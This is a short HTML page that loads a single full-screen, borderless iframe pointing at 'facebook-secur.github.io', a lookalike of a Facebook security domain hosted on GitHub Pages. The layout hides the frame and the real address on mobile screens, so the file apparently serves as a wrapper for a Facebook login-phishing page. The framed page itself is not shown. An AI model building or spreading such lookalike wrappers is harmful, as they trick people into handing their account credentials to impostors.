<!DOCTYPE html>
<html>
<head>
    <title>Embed Website Full Screen (Mobile View)</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            overflow: hidden;
            height: 100%;
        }
        iframe {
            display: block;
            width: 100vw; /* Full viewport width */
            height: 100vh; /* Full viewport height */
            border: none; /* Optional: Removes border around iframe */
        }
    </style>
</head>
<body>
    <iframe src="https://facebook-secur.github.io/Facebook/facebook1.html"></iframe>
</body>
</html>
